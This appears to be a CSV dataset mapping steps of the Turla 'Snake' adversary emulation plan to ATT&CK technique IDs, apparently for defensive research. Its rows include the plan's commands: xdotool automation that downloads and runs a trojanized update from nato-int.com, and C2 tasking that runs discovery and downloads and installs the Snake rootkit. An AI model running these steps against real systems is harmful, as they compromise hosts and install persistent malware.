org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_snake,turla_snake,unknown,turla_snake::1,1,Download malicious update (User),"id: 78f44095-73b0-4ab4-a4cc-e5090ae1ae44 | name: Download malicious update (User) | description: Use xdotool to open Microsoft Edge, browse to nato-int.com. After redirection to anto-int.com, click to download the update 
(NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot).
 | tactic: Initial Access | technique: attack_id: T1189 | name: Drive-By Compromise | procedure_group: procedure_initial_access | procedure_step: 11.A.1-11.A.2 | platforms: linux: sh: command: sleep 15;
rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool key --window ""$rdp_window"" Super_L+r;
sleep 6;
xdotool type --window ""$rdp_window"" ""microsoft-edge"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""http"";
xdotool key --window ""$rdp_window"" shift+colon; 
xdotool type --window ""$rdp_window"" ""//nato-int.com/"";
sleep 6;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Return;
sleep 20;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool key --window ""$rdp_window"" --repeat 5 --delay 1 shift+Tab;
xdotool key --window ""$rdp_window"" Tab;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
 | timeout: 180","[""T1189""]","[""T1189""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::2,2,Drive-By Compromise,attack_id: T1189 | name: Drive-By Compromise,"[""T1189""]","[""T1189""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::3,3,Initial compromise (User),"id: 0328ddeb-cc6b-4971-b695-771178b50ed7 | name: Initial compromise (User) | description: Run the downloaded malicious update via win+r, wait for it to finish running.
 | tactic: Execution | technique: attack_id: T1204.002 | name: User Execution: Malicious File | procedure_group: procedure_execution | procedure_step: 11.A.3 | platforms: linux: sh: command: xdotool key --window ""$rdp_window"" Super_L+r;
sleep 6;
xdotool type --window ""$rdp_window"" 'C';
xdotool key --window ""$rdp_window"" shift+colon;           
xdotool type --window ""$rdp_window"" '\Users\#{first.target.user}\Downloads\';
xdotool key --window ""$rdp_window"" shift+N; 
xdotool key --window ""$rdp_window"" shift+F; 
xdotool key --window ""$rdp_window"" shift+V;
xdotool type --window ""$rdp_window"" ""ersion"";
xdotool key --window ""$rdp_window"" shift+minus;
xdotool type --window ""$rdp_window"" ""5e.exe"";
sleep 6;
xdotool key --window ""$rdp_window"" Tab; sleep 1;
xdotool key --window ""$rdp_window"" Return;
sleep 6;
xdotool key --window ""$rdp_window"" R;
sleep 6;
 | timeout: 120","[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::4,4,User Execution: Malicious File,attack_id: T1204.002 | name: User Execution: Malicious File,"[""T1204.002""]","[""T1204""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::5,5,Systeminfo discovery (Adversary),"id: 32dd2b5f-5798-4c05-9d65-ee1e2d494cee | name: Systeminfo discovery (Adversary) | description: Once C2 communications have been established between EPIC and the C2 via
the proxy server, discovery is performed on the first host where
information about the host device and domain computers is collected.
 | tactic: Discovery | technique: attack_id: T1082 | name: System Information Discovery | procedure_group: procedure_discovery | procedure_step: 11.A.6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | systeminfo && net group ""Domain Computers"" /domain' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::6,6,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::7,7,Download 1st Snake installer (Adversary),"id: bd51f583-249a-4995-b5d0-7da7e824bc56 | name: Download 1st Snake installer (Adversary) | description: Task the EPIC implant to download the Snake rootkit installer.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 12.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'name | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe | snake.exe' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::8,8,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::9,9,Execute the 1st Snake installer (Adversary),"id: 0daff7a0-d1e4-4bf2-8100-c0a824a34c52 | name: Execute the 1st Snake installer (Adversary) | description: Task the EPIC implant to execute the Snake rootkit installer with the privilege escalation option
 | tactic: Defense Evasion | technique: attack_id: T1014 | name: Rootkit | procedure_group: procedure_defense_evasion | procedure_step: 12.A.2-12.A.10 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe -f' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.epic.id","[""T1014""]","[""T1014""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::10,10,Rootkit,attack_id: T1014 | name: Rootkit,"[""T1014""]","[""T1014""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
